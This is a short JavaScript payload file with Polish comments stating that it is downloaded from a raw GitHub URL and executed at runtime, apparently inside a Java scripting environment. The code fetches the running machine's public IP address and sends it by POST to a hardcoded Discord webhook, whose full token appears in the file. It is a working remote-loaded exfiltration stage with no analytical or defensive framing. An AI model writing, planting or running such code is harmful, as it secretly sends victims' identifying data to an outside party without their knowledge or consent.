// Plik: https://raw.githubusercontent.com/user/repo/main/payload.js
// To się POBIERA i WYKONUJE w runtime

var discord = "https://discord.com/api/webhooks/1474940093713354853/eiPHZp7NiN0FFnw06_7gO0Ct7cvFIQ2d5y6UjGy6gPnS_CpJxltWwztqP6t7IewHVr1e";
var ipUrl = new java.net.URL("http://checkip.amazonaws.com");
var ip = new java.lang.String(ipUrl.openStream().readAllBytes()).trim();

var hook = new java.net.URL(discord);
var conn = hook.openConnection();
conn.setRequestMethod("POST");
conn.setDoOutput(true);
conn.setRequestProperty("Content-Type", "application/json");

var msg = '{"content":"IP: ' + ip + '"}';
conn.getOutputStream().write(new java.lang.String(msg).getBytes());
conn.getResponseCode();